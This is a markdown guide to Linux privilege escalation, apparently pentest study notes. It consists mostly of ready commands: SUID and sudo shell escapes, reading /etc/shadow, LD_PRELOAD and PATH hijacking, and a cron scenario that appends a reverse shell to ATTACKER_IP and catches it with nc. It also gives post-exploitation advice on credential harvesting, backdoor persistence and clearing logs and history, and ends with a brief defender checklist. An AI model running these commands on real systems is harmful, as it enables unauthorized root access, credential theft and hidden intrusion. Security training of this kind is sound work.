# 🛠️ Linux Privilege Escalation

Systematic approach to privilege escalation on Linux systems.

## Overview

This guide covers methodology for identifying and exploiting Linux privilege escalation vectors. Use the [Privilege Escalation Checklist](../CheatSheets/Privilege-Escalation-Checklist.md) as reference.

---

## Initial Enumeration

### System Information
```bash
uname -a
lsb_release -a
cat /etc/os-release
```

### User & Group Information
```bash
whoami
id
groups
sudo -l      # Check sudoers
cat /etc/passwd
cat /etc/shadow (if readable)
```

### Installed Software
```bash
dpkg -l          # Debian
rpm -qa          # RedHat
ls /opt
ls /usr/local
```

### Running Processes
```bash
ps aux
ps aux | grep root    # Root processes
```

### Network Information
```bash
netstat -tulpn
ss -tulpn
```

### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Writable Directories
```bash
find / -writable -type d 2>/dev/null | head -20
```

---

## Common PE Vectors

### 1. SUID Binaries

**Find SUID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Check against GTFOBins:**
- https://gtfobins.github.io/

**Common vulnerable SUID binaries:**
- `find` with shell escape
- `awk` with system calls
- `sed` with system calls
- `vim` with shell escape
- `man` with pager escape

**Example exploit (if `find` is SUID):**
```bash
find / -type f -name "*.txt" -exec cat /etc/shadow \; 2>/dev/null
```

### 2. Sudo Abuse

**Check sudoers:**
```bash
sudo -l
```

**Common misconfigurations:**
- `NOPASSWD` entries
- Command wildcards
- LD_PRELOAD in env_keep

**Example (NOPASSWD for binary with shell escape):**
```bash
sudo /usr/bin/vim -c '!sh'
```

### 3. Kernel Exploits

**Check kernel version:**
```bash
uname -r
```

**Search for CVEs:**
```bash
searchsploit Linux kernel 5.4
```

**Common targets:**
- CVE-2016-5195 (DirtyCOW)
- CVE-2021-22555 (Netfilter)
- CVE-2022-0847 (DirtyPipe)

### 4. Cron Job Hijacking

**Find cron jobs:**
```bash
crontab -l
sudo crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
```

**Check permissions:**
```bash
ls -la /var/spool/cron/crontabs/
```

**Exploitation:**
- If cron script is writable, add reverse shell
- If cron runs as root, execute as root

### 5. File Permission Issues

**Check for world-writable sensitive files:**
```bash
find / -writable -type f 2>/dev/null
```

**Common targets:**
- Configuration files
- Python files
- Shell scripts
- Init scripts

### 6. LD_PRELOAD Injection

**Check for LD_PRELOAD in sudoers:**
```bash
sudo -l | grep -i ld_preload
```

**Exploitation:**
```bash
# Create malicious library
gcc -shared -fPIC evil.c -o evil.so

# Execute with LD_PRELOAD
sudo LD_PRELOAD=./evil.so /usr/bin/program
```

### 7. LD_LIBRARY_PATH Hijacking

**Vulnerable when:**
- Program uses relative paths for libraries
- Sudo preserves LD_LIBRARY_PATH

**Exploitation:**
```bash
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH
# Create fake library in /tmp
sudo /usr/bin/vulnerable_program
```

### 8. PATH Manipulation

**Vulnerable when:**
- Program runs binaries without full paths
- Sudo preserves PATH

**Exploitation:**
```bash
export PATH=/tmp:$PATH
# Create fake binary in /tmp
sudo /usr/bin/vulnerable_program
```

---

## Using LinPEAS

```bash
# Download LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240722/linpeas.sh -o linpeas.sh

# Run it
bash linpeas.sh
```

**Output shows:**
- Red (critical findings)
- Yellow (interesting findings)
- Green (informational)

---

## Using Metasploit

```
use post/linux/gather/enum_system
```

---

## GTFOBins Exploitation

```bash
# Check if binary has GTFOBins entry
# Example: if 'awk' is SUID:
awk 'BEGIN {system("id")}'

# If 'find' is SUID:
find . -exec id \;

# If 'vim' is SUID:
vim -c ':!/bin/sh'
```

---

## Manual PE Scenario

### Example: Writable Cron Script

**1. Identify cron job:**
```bash
cat /etc/crontab
# 0 2 * * * root /opt/backup.sh
```

**2. Check permissions:**
```bash
ls -la /opt/backup.sh
# -rwxrwxrwx (world-writable!)
```

**3. Add reverse shell:**
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
```

**4. Wait for cron to execute or trigger manually:**
```bash
sudo /opt/backup.sh
```

**5. Catch shell:**
```bash
nc -lvnp 4444
```

---

## Post-PE Steps

1. **Verify elevated privileges** — `id` should show uid=0
2. **Harvest credentials** — `/etc/shadow`, SSH keys, history
3. **Establish persistence** — SSH key, cron backdoor, new user
4. **Cover tracks** — Clear logs, remove temporary files

---

## Defense Evasion

### Avoid Detection
```bash
# Clear history
history -c
rm ~/.bash_history

# Use wildcards to obfuscate commands
/u?/?n -a

# Disable logging
export HISTFILE=/dev/null
```

---

## Automated Tools

| Tool | Purpose |
|------|---------|
| LinPEAS | Automated enumeration |
| unix-privesc-check | Privilege escalation checker |
| Mimikatz | Credential extraction |
| BeRoot | Privilege escalation suggester |
| DirtyCOW exploit | Kernel exploit |

---

## Common Mistakes

❌ Running noisy scanners during assessment
❌ Not checking sudoers first
❌ Missing SUID binaries
❌ Not checking cron jobs
❌ Forgetting to check running processes
❌ Not documenting all findings

---

## Prevention (Defender Perspective)

✅ Keep systems patched
✅ Use principle of least privilege
✅ Audit sudoers carefully
✅ Monitor SUID binaries
✅ Check file permissions regularly
✅ Disable unnecessary services
✅ Monitor cron jobs
✅ Enable SELinux/AppArmor

---

**Last Updated:** July 10, 2026
